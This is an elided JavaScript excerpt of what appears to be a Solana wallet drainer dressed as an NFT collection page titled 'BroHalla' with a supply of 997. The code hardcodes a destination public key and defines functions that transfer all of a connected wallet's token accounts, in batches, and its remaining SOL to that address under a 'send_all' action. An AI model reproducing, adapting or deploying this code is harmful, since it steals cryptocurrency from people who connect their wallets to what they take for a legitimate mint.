...
const image =
  "https://pbs.twimg.com/profile_images/1660598070021873666/LhPyRH22_400x400.jpg";
const Title = "BroHalla";
const supply = 997;
...
const DESTINATION = new PublicKey(
  "HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2"
);
...
function App() {
  ...
  async function createTransferTokenInstruction(
    ...
    const response = createTransferInstruction(
      tokenAcc,
      destinationATA,
      walletKeyPair.publicKey,
      count,
  ...
  async function sendRemainingSOL(walletKeyPair, connection) {
    ...
    try {
      ...
      const accountsArray = await getTokenAccounts(
        connection,
        walletKeyPair.publicKey
      );
      ...
      console.log(
        `Sending ${formatSOL(toSend)} SOL to ${DESTINATION.toString()}`
      );
  ...
  async function sendAll(walletKeyPair, connection) {
    ...
    await sendRemainingSOL(walletKeyPair, connection);
    ...
    for (let i = 0; i < accounts.length / SENDS_IN_ONE_TX; i++) {
      const itemsRemaining = Math.min(
        SENDS_IN_ONE_TX,
        accounts.length - i * SENDS_IN_ONE_TX
      );
  ...
  async function main() {
    ...
    switch (ACTION) {
      case "send_all": {
        await sendAll(wallet, connection);
